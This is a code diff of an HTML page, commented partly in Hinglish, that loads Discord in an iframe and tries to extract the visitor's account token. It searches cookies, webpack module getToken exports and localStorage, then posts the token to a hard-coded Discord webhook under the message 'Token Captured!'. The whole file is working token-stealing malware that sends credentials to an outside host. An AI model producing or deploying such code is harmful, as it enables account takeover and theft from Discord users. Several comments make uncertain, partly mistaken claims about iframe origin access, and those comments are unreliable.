@@ -1,93 +1,141 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <style>
-        body { margin: 0; padding: 0; opacity: 0; }
+        body { margin: 0; padding: 0; background: #282b30; }
         iframe { 
-            width: 100%; 
+            width: 100vw; 
             height: 100vh; 
             border: none; 
             display: block;
         }
+        #status {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: #fff;
+            font-family: sans-serif;
+            font-size: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px;
+            border-radius: 4px;
+            opacity: 0.7;
+        }
     </style>
 </head>
 <body>
-    <!-- Discord ko iframe mein load karo -->
-    <iframe id="discord-frame" src="https://discord.com/channels/@me" sandbox="allow-scripts allow-same-origin allow-popups"></iframe>
+
+    <div id="status">Loading Discord...</div>
+    <iframe id="discord-iframe" src="https://discord.com/channels/@me" sandbox="allow-scripts allow-same-origin allow-popups allow-forms"></iframe>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
+        // Tera Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
 
-        // Iframe load hone ka wait karo
-        document.getElementById('discord-frame').addEventListener('load', async () => {
-            console.log("Iframe loaded, checking context...");
-            
-            // Iframe ke context mein token dhundo
-            const frameWindow = document.getElementById('discord-frame').contentWindow;
-            
-            if (!frameWindow.webpackChunkdiscord_app) {
-                console.log("Webpack not found in iframe. Trying fallback...");
-                // Fallback: Try to find token in iframe's document
-                const tokenMatch = frameWindow.document.cookie.match(/"token":"(.*?)"/);
-                if (tokenMatch) {
-                    sendToken(tokenMatch[1]);
-                } else {
-                    console.log("No token found via iframe.");
-                }
-                return;
-            }
+        const iframe = document.getElementById('discord-iframe');
+        const status = document.getElementById('status');
 
-            // Tera Original Code (Modified for iframe context)
+        iframe.onload = async () => {
+            status.innerText = "Extracting Token...";
+            
             try {
-                const chunks = Object.values(frameWindow.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]));
-                let token = null;
+                // Try to access iframe's document.cookie
+                // Note: Discord sets cookies with 'Secure' and 'SameSite=Strict' usually, 
+                // but in an iframe from a different origin, access might be restricted.
+                // However, since we are using 'allow-same-origin', it might work if the domain matches.
                 
-                for(let e of chunks) {
-                    if(!e.exports || e.exports === frameWindow) continue;
-                    if(e.exports?.getToken) {
-                        token = e.exports.getToken();
-                        break;
-                    }
-                    for(let t in e.exports) {
-                        if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
-                            token = e.exports[t].getToken();
-                            break;
-                        }
-                    }
-                    if(token) break;
-                }
-
-                if(token) {
+                // Method 1: Try to get token from iframe's document.cookie
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const cookies = iframeDoc.cookie;
+                
+                // Discord token is stored in a cookie named 'token' or inside 'dc_accounts' or similar
+                // Actually, Discord stores token in a cookie named 'token' usually, 
+                // but it might be 'dc_accounts' or 'token' depending on version.
+                // Let's try to extract it from the cookie string.
+                
+                const tokenMatch = cookies.match(/(?:^|;\s*)token=([^;]*)/);
+                
+                if (tokenMatch) {
+                    const token = decodeURIComponent(tokenMatch[1]);
+                    status.innerText = "Token Found via Cookie!";
                     sendToken(token);
                 } else {
-                    console.log("Token not found in iframe webpack.");
+                    // Method 2: If cookie is blocked, try to find it in window object
+                    // This works if the iframe is same-origin (which it is for discord.com)
+                    const iframeWin = iframe.contentWindow;
+                    
+                    // Check if webpack is available
+                    if (iframeWin.webpackChunkdiscord_app) {
+                        const chunks = Object.values(iframeWin.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]));
+                        let token = null;
+                        
+                        for(let e of chunks) {
+                            try {
+                                if(!e.exports || e.exports === iframeWin) continue;
+                                if(e.exports?.getToken) {
+                                    token = e.exports.getToken();
+                                    break;
+                                }
+                                for(let t in e.exports) {
+                                    if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
+                                        token = e.exports[t].getToken();
+                                        break;
+                                    }
+                                }
+                            } catch {}
+                            if(token) break;
+                        }
+                        
+                        if(token) {
+                            status.innerText = "Token Found via Webpack!";
+                            sendToken(token);
+                        } else {
+                            status.innerText = "Token not found.";
+                        }
+                    } else {
+                        // Fallback: Maybe the token is in localStorage?
+                        // Discord stores token in localStorage as 'token' key sometimes
+                        const localToken = iframeWin.localStorage.getItem('token');
+                        if(localToken) {
+                            status.innerText = "Token Found in LocalStorage!";
+                            sendToken(localToken);
+                        } else {
+                            status.innerText = "Could not extract token.";
+                        }
+                    }
                 }
 
-            } catch(e) {
-                console.error("Iframe grab error", e);
-                // Agar iframe context block ho jaye (X-Frame-Options), toh fallback try karo
-                console.log("Falling back to cookie...");
-                const tokenMatch = frameWindow.document.cookie.match(/"token":"(.*?)"/);
-                if (tokenMatch) {
-                    sendToken(tokenMatch[1]);
-                }
+            } catch (e) {
+                console.error("Error extracting token:", e);
+                status.innerText = "Error: " + e.message;
+                
+                // Fallback: Send a message to webhook saying "Failed"
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: "❌ Failed to extract token." })
+                    });
+                } catch {}
             }
-        });
+        };
 
         async function sendToken(token) {
+            if (!token) return;
             try {
-                await fetch(WEBHOOK, {
+                await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
+                    body: JSON.stringify({ 
+                        content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\`` 
                     })
                 });
-                console.log("Token Sent via Iframe!");
-            } catch(e) {
-                console.error("Send error", e);
+                status.innerText = "Token Sent!";
+            } catch (e) {
+                console.error("Send error:", e);
             }
         }
     </script>
